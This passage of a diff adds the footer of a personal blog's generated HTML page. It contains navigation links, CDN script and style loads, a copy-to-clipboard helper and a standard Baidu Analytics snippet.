+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li><!--
+     --><!--
+       --><li><a href="https://n0nome.github.io/tags/random/">random</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?8805a0d3f14df2c09dd76694ea3b92b7";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+<!-- FancyBox -->
+
+    <script src='https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js'></script>
+
+
+</body>
+</html>
